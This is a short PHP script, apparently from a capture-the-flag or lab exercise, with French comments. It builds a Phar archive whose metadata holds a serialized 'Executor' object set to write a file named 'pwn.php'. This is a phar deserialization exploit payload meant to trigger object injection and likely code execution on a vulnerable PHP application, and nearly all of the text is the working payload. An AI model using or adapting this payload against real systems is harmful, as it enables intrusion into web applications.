<?php
	class Executor {
		private $filename = "pwn.php";
		private $signature = True; // signature
		private $init = false;
	}

	$phar = new Phar("test.phar");
	$phar->startBuffering();
	$phar->setStub("<?php __HALT_COMPILER(); ?>"); // stub
	$o = new Executor();
	$phar->setMetadata($o); // manifeste contenant le contenu
	$phar->addFromString("text.txt", 'test'); // le contenu du fichier
	$phar->stopBuffering();
?>

